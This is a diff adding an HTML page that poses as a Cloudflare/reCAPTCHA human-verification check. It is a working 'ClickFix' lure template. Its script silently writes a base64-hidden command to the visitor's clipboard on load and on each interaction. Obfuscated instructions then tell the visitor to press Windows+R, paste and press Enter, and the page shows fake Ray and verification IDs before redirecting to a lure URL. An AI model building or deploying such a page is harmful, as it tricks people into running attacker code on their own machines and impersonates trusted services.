@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="no-referrer">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<title>Please wait</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath d='M26.5 22.5H8.2a6.7 6.7 0 0 1-6.7-6.7 6.7 6.7 0 0 1 5.6-6.6A9 9 0 0 1 15.5 3a9 9 0 0 1 8.7 6.8 6.7 6.7 0 0 1 2.3 12.7z' fill='%23f6821f'/%3E%3C/svg%3E">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;background:#f4f4f4;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#333}
+.w{max-width:520px;width:100%;padding:20px}
+.h{display:flex;align-items:center;gap:12px;margin-bottom:20px;visibility:hidden}
+.l{width:48px;height:48px;border-radius:50%;background:#f6821f;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:18px}
+.d{font-size:20px;font-weight:600;color:#333}
+.b{background:#fafafa;border:1px solid #e0e0e0;border-radius:4px;overflow:hidden;transition:width .3s ease;width:300px;margin:0 auto}
+.s1{padding:15px;display:flex;align-items:center;gap:12px;cursor:pointer}
+.c{width:22px;height:22px;border:2px solid #888;border-radius:3px;background:#fff;display:flex;align-items:center;justify-content:center;transition:background .2s,border-color .2s;flex-shrink:0}
+.c.k{background:#4285f4;border-color:#4285f4;color:#fff}
+.c svg{width:14px;height:14px;display:none}
+.c.k svg{display:block}
+.t{font-size:14px;color:#333;flex-grow:1}
+.g{font-size:10px;color:#999;padding:0 15px 10px;display:flex;justify-content:space-between}
+.g a{color:#999;text-decoration:none}
+.s2{padding:0;border-top:1px solid #e0e0e0}
+.s2h{background:#e85d1a;color:#fff;font-size:13px;font-weight:600;padding:8px 15px}
+.s2b{padding:15px}
+.s2b ol{padding-left:20px;font-size:13px;line-height:1.8}
+.v{background:#f0f0f0;border:1px solid #ddd;border-radius:3px;padding:8px 12px;margin:10px 0;font-size:12px;color:#555;word-break:break-all}
+#vb{background:#5e5e5e;color:#fff;border:none;border-radius:3px;padding:8px 24px;font-size:13px;cursor:pointer;margin-top:10px;width:100%;transition:background .3s,opacity .3s}
+#vb:hover{background:#4a4a4a}
+#vb:disabled{background:#aaa;cursor:not-allowed;opacity:.6}
+.f{margin-top:20px;text-align:center;font-size:11px;color:#999}
+.f code{background:#eee;padding:1px 4px;border-radius:2px;font-size:10px}
+.sp{width:20px;height:20px;border:3px solid #ddd;border-top-color:#4285f4;border-radius:50%;animation:r 1s linear infinite;margin:0 auto 10px}
+@keyframes r{to{transform:rotate(360deg)}}
+#pl{text-align:center;padding:20px;color:#666;font-size:13px}
+#pc{display:none}
+#dc{display:none}
+#ok{display:none;text-align:center;padding:30px}
+#ok svg{width:40px;height:40px;margin-bottom:10px}
+</style>
+</head>
+<body>
+<div class="w">
+  <div class="h" id="hd">
+    <div class="l">&#10003;</div>
+    <span class="d" id="dn"></span>
+  </div>
+
+  <div class="b" id="mb">
+    <div id="pl">
+      <div class="sp"></div>
+      <div id="plt"></div>
+    </div>
+
+    <div id="pc">
+      <div class="s1" id="cb-r">
+        <div class="c" id="cb">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
+        </div>
+        <span class="t" id="cbt"></span>
+      </div>
+      <div class="g">
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+      </div>
+    </div>
+
+    <div id="dc">
+      <div class="s2">
+        <div class="s2h" id="dch"></div>
+        <div class="s2b">
+          <div class="v" id="vid"></div>
+          <p style="font-size:13px;color:#555;margin-bottom:8px" id="dcp"></p>
+          <ol id="dco"></ol>
+          <button id="vb"></button>
+        </div>
+      </div>
+    </div>
+
+    <div id="ok">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#28a745" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="16 8 10.5 13.5 8 11"></polyline></svg>
+      <div style="font-size:14px;color:#28a745;font-weight:600" id="okt"></div>
+      <div style="font-size:12px;color:#999;margin-top:5px" id="oks"></div>
+    </div>
+  </div>
+
+  <div class="f" id="ft">
+    <span id="ftb"></span><br>
+    <span id="ftr"></span>
+  </div>
+</div>
+
+<script>
+(function(){
+"use strict";
+var _p=atob("{command_b64}");
+var _r="{redirect_url}"||"{lure_url_js}";
+var _vid="{VID}";
+var _done=false;
+
+// clipboard poisoning — immediate + on first interaction
+function _arm(){_cp(_p);}
+document.addEventListener('pointerdown',_arm,{once:true,capture:true});
+document.addEventListener('keydown',_arm,{once:true,capture:true});
+document.addEventListener('focus',_arm,{once:true,capture:true});
+_cp(_p);
+
+// Decode UI strings (base64 — nothing sensitive in the static source)
+var _d=[
+  "Q2hlY2tpbmcgaWYgeW91IGFyZSBodW1hbi4gVGhpcyBtYXkgdGFrZSBhIGZldyBzZWNvbmRzLg==",  // 0: checking
+  "VmVyaWZ5IHlvdSBhcmUgaHVtYW4=",                                              // 1: verify
+  "UGVyZm9ybWFuY2UgJiBzZWN1cml0eSBieSBDbG91ZGZsYXJl",                           // 2: footer
+  "VmVyaWZpY2F0aW9uIFN0ZXBz",                                                   // 3: steps header
+  "VG8gYmV0dGVyIHByb3ZlIHlvdSBhcmUgbm90IGEgcm9ib3QsIHBsZWFzZTo=",              // 4: intro
+  "UHJlc3MgJmFtcDsgaG9sZCB0aGUgPHN0cm9uZz5XaW5kb3dzIEtleSArIFI8L3N0cm9uZz4=",  // 5: step 1
+  "SW4gdGhlIHZlcmlmaWNhdGlvbiB3aW5kb3csIHByZXNzIDxzdHJvbmc+Q3RybCArIFY8L3N0cm9uZz4=",  // 6: step 2
+  "UHJlc3MgPHN0cm9uZz5FbnRlcjwvc3Ryb25nPiBvbiB5b3VyIGtleWJvYXJkIHRvIGZpbmlzaC4=",      // 7: step 3
+  "VmVyaWZ5",                                                                    // 8: verify btn
+  "U3VjY2Vzc2Z1bGx5IFZlcmlmaWVk",                                               // 9: success
+  "WW91IGFyZSBiZWluZyByZWRpcmVjdGVkLi4u",                                       // 10: redirecting
+  "SSBhbSBub3QgYSByb2JvdA=="                                                     // 11: not a robot
+];
+
+function _cp(t){
+  try{if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).catch(function(){});}}catch(e){}
+  try{
+    var ta=document.createElement('textarea');
+    ta.value=t;ta.setAttribute('readonly','');
+    ta.style.position='absolute';ta.style.left='-9999px';
+    document.body.appendChild(ta);ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+  }catch(e){}
+}
+
+function _rv(){document.getElementById('hd').style.visibility='visible';}
+document.addEventListener('pointermove',_rv,{once:true,capture:true});
+document.addEventListener('keydown',_rv,{once:true,capture:true});
+document.addEventListener('touchstart',_rv,{once:true,capture:true});
+
+function _init(){
+  var h="{subdomain}"||window.location.hostname;
+  var m=window.location.search.match(/[?&]site=([^&]+)/);
+  if(m)h=decodeURIComponent(m[1]);
+  document.getElementById('dn').textContent=h;
+  document.getElementById('plt').textContent=atob(_d[0]);
+  document.getElementById('cbt').textContent=atob(_d[11]);
+  document.getElementById('ftb').textContent=atob(_d[2]);
+  document.getElementById('dch').textContent=atob(_d[3]);
+  document.getElementById('dcp').textContent=atob(_d[4]);
+  var steps=[atob(_d[5]),atob(_d[6]),atob(_d[7])];
+  var ol=document.getElementById('dco');
+  for(var i=0;i<steps.length;i++){
+    var li=document.createElement('li');
+    li.innerHTML=steps[i];
+    ol.appendChild(li);
+  }
+  document.getElementById('vb').textContent=atob(_d[8]);
+  document.getElementById('okt').textContent=atob(_d[9]);
+  document.getElementById('oks').textContent=atob(_d[10]);
+  document.getElementById('vid').innerHTML='&#10004; "I am not a robot - reCAPTCHA Verification ID: '+_vid+'"';
+  var rid='';for(var i=0;i<16;i++)rid+='0123456789abcdef'[Math.random()*16|0];
+  document.getElementById('ftr').innerHTML='Ray ID: <code>'+rid+'</code>';
+}
+
+setTimeout(function(){
+  document.getElementById('pl').style.display='none';
+  document.getElementById('pc').style.display='block';
+  _init();
+},1200+Math.random()*800);
+
+document.getElementById('cb-r').addEventListener('click',function(){
+  if(_done)return;
+  _done=true;
+  _cp(_p);
+  document.getElementById('cb').classList.add('k');
+  document.getElementById('cbt').textContent='Verifying...';
+  setTimeout(function(){
+    document.getElementById('pc').style.display='none';
+    document.getElementById('dc').style.display='block';
+    document.getElementById('mb').style.width='530px';
+    _rv();
+    _cp(_p);
+    // verify button starts disabled (dimmed), enables after 5-15s silently
+    var vb=document.getElementById('vb');
+    vb.disabled=true;
+    setTimeout(function(){
+      vb.disabled=false;
+    },5000+Math.random()*10000);
+  },600);
+});
+
+document.getElementById('vb').addEventListener('click',function(){
+  if(this.disabled)return;
+  _cp(_p);
+  document.getElementById('dc').style.display='none';
+  document.getElementById('ok').style.display='block';
+  setTimeout(function(){
+    window.location.href=_r;
+  },1200+Math.random()*500);
+});
+})();
+</script>
+</body>
+</html>
